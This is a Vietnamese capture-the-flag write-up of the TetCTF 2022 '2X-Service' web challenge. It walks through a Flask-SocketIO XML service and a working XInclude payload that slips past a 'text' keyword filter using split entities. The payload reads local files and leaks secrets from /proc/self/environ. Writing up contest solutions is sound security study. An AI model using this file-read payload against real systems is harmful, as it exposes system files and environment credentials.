---
title: TetCTF 2022 | Web Exploitation | 2X-Service
date: 2022-01-01-19:33:00 0700
---

# 2X-Service

![2x-service](https://user-images.githubusercontent.com/82533607/147850702-16a63ccc-ba1d-4543-81ac-4aa052659960.png)

## Source code & analysis

### Source code:

Đây là source code của `app.py`:

```python
import random
import os
from flask import Flask, render_template, render_template_string, url_for, redirect, request
from flask_socketio import SocketIO, emit, send
from xml.etree import ElementTree, ElementInclude

app = Flask(__name__)

app.config['SECRET_KEY'] = 'XXXXXXXSECREKTXXXXXXXX'
socketio = SocketIO(app)

@app.route('/')
def index():
	return redirect(url_for('dashboard'))


@app.route('/dashboard')
def dashboard():
	return render_template('./dashboard.html')

@app.route('/source')
def source():
	return render_template('source.html')

@app.route('/about')
def about():
	return render_template('about.html')


@socketio.on('message')
def handle_message(xpath, xml):
	if len(xpath) != 0 and len(xml) != 0 and "text" not in xml.lower():
		try:
			res = ''
			root = ElementTree.fromstring(xml.strip())
			ElementInclude.include(root)
			for elem in root.findall(xpath):
				if elem.text != "":
					res += elem.text + ", "
			emit('result', res[:-2])
		except Exception as e:
			emit('result', 'Nani?')
	else:
		emit('result', 'Nani?')


@socketio.on('my event')
def handle_my_custom_event(json):
	print('received json: ' + str(json))

if __name__ == '__main__':
	socketio.run(app, host='0.0.0.0', port=8003)
```

### Analysis

Ở bài này sử dụng websocket thông qua `flask-socketio`, nhìn qua source code của `/dardboard` ta thấy có `jquery` và `socketio` được import sẵn, nhưng chưa khởi tạo `socket`:

```html
<link rel="stylesheet" href="static/css/tsu.css">
<script src="static/js/jquery.min.js"></script>
<script src="static/js/socket.io.js"></script>
<script src="static/js/tsu.js"></script>


<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>

  <div class="header">
    <a href="#default" class="logo">2X-Service</a>
    <div class="header-right">
      <a class="active" href="/">Home</a>
      <a href="/source">Source</a>
      <a href="/about">About</a>
    </div>
  </div>

<body>

<br><br>
<center>
	<div class="form" >
	    <label>XPATH</label><br>
	    <input type="text" id="xpath" placeholder="Ex: attribute"><br>

	    <label>XML</label>
	    <textarea type="text" id="xml" rows="25" placeholder="Ex:&#10;<person>&#10;<name>tsu</name>&#10;<attribute>deptrai</attribute>&#10;</person>" ></textarea>
	  
	    <input type="submit" id="process" value="Process">
	</div>
</center>
```

Vì vậy, để gửi được request từ client đến socket tại server, ta cần thiết lập socket, sau khi đọc qua doc của `flask-socket`, mình đã tạo ra đoạn code `jquery` như sau:

```js
// Define the socket
socket = io()
// Connect to server's socket
socket.connect('http://207.148.119.136:8003')
// Test connection:
socket.on('connect', function() {
    socket.send('hello?', 'hi')
    console.log(socket.connected)
})
// Listen to response, then log to console
socket.on('result', function (data) {
    console.log(data);
});
// Submit form's content to server's socket
$('.form').submit(function(){
    socket.send($('#xpath').val(), $('#xml').val())
})
```

Test thử xem sao:

![socket_connected](https://user-images.githubusercontent.com/82533607/147850835-c6220de1-ba84-482b-b38f-da04f3c15ecc.png)

Vậy là đã xong phần socket, bây giờ cần phân tích source code một chút, cụ thể là phần `message`:

```python
@socketio.on('message')
def handle_message(xpath, xml):
	if len(xpath) != 0 and len(xml) != 0 and "text" not in xml.lower():
		try:
			res = ''
			root = ElementTree.fromstring(xml.strip())
			ElementInclude.include(root)
			for elem in root.findall(xpath):
				if elem.text != "":
					res += elem.text + ", "
			emit('result', res[:-2])
		except Exception as e:
			emit('result', 'Nani?')
	else:
		emit('result', 'Nani?')
```

## Exploit

Đọc qua thì sẽ thấy phần này khá giống bài [X-Service](https://dauhoangtai.github.io/ctf/2021/11/13/WRITEUP-SVATTT-FINAL-2021-WEB.html#challenge-x-service) của vòng chung kết SVATTT 2021.

Ta có thể sử dụng payload sau:

```xml
<?xml version='1.0'?>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="path_of_the_file" parse="text"/>
</document>
```

Nhưng có một vấn đề là, `text` bị filter, sau khi đọc qua doc của [xi:include](https://www.w3.org/TR/xinclude-11) thì mình nhận ra rằng, chẳng có `parser` nào có thể giải quyết vấn đề này, vì vậy, chỉ còn cách làm thế nào để `text` xuất hiện mà không bị filter.

Thực ra mọi chuyện khá đơn giản, chúng ta có thể dùng phương pháp `concat` như sau:

- Đầu tiên, define 2 biến `te` và `xt` thông qua `ENTITY`

```xml
<?xml version='1.0'?>
<!DOCTYPE resources [
  <!ENTITY te "te">
  <!ENTITY xt "xt">
]>
```

- Tiếp theo, sử dụng 2 biến đó:

```xml
<document xmlns:xi="http://www.w3.org/2001/XInclude">
<p>
  <xi:include href="flag.txt" parse="&te;&xt;"/>
</p>
</document>
```

> &te;&xt; <=> "te" + "xt" = "text"

Và ta có payload hoàn chỉnh:

```xml
<?xml version='1.0'?>
<!DOCTYPE resources [
  <!ENTITY te "te">
  <!ENTITY xt "xt">
]>

<document xmlns:xi="http://www.w3.org/2001/XInclude">
<p>
  <xi:include href="flag.txt" parse="&te;&xt;"/>
</p>
</document>
```

Sử dụng `xpath = *`, đầu tiên, thử trên local xem sao?

![test](https://user-images.githubusercontent.com/82533607/147851083-50c4ca78-6545-44eb-a839-51b320ac056b.png)

OK, vậy là payload hoạt động tốt, vậy thử trên server xem sao?

![test_server](https://user-images.githubusercontent.com/82533607/147851133-1ca3f3c1-3383-49ff-9735-fa62e78fe437.png)

Oh, vậy là file `flag.txt` có thể không tồn tại, vậy là nó nằm ở đâu?

Sau một hồi "fuzzing bằng cơm" thì tôi vô tình tìm thấy được flag tại `/proc/self/environ`:

```xml
<?xml version='1.0'?>
<!DOCTYPE resources [
  <!ENTITY te "te">
  <!ENTITY xt "xt">
]>

<document xmlns:xi="http://www.w3.org/2001/XInclude">
<p>
  <xi:include href="/proc/self/environ" parse="&te;&xt;"/>
</p>
</document>
```

![flag](https://user-images.githubusercontent.com/82533607/147851230-9c48d2de-6d3e-44f0-a123-6e741fcbc1bd.png)

Flag: `FLAG=TetCTF{Just_Warm_y0u_uP_:P__}`

> Từ sáng đến tối chỉ để giải được 1 bài web duy nhất 😞
